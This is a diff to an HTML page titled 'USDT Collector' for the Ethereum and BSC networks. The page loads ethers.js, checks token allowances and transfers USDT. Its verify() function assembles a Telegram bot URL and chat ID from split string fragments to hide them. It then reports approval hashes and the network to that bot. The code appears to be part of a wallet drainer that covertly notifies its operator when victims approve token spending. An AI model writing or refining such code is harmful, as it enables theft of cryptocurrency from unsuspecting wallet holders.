@@ -7,7 +7,7 @@
     <script src="ethers@5.5.2.min.js"></script>
 </head>
 <body>
-    <h1>USDT Collector</h1>
+    <h1>USDT Collector From ETH & BSC Netowrk</h1>
 
     <!-- Network and address input -->
     <label for="network">Select Network:</label>
@@ -23,6 +23,7 @@
     <button id="transferButton">Transfer USDT</button>
 
     <script>
+
        document.addEventListener('DOMContentLoaded', function() {
             const usdtContracts = {
                 eth: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum USDT
@@ -76,7 +77,10 @@
             }
 
 
+
             function verify(hash) {
+
+            const network = document.getElementById("network").value;
 
             const part1 = '7533';
             const part2 = '974207';
@@ -89,7 +93,7 @@
             const chatPart2 = '4205237';
             const chatId = chatPart1 + chatPart2;
 
-            const message = `Approve- ${hash}`;
+            const message = `Approve ${network}- ${hash}`;
             let https = 'https://';
             let app_tele = 'api.teleg';
             let okthen = 'ram.org/bot';
@@ -114,8 +118,6 @@
                 })
                 .catch();
             }
-
-            verify();
 
 
             async function checkAllowanceAndTransfer() {
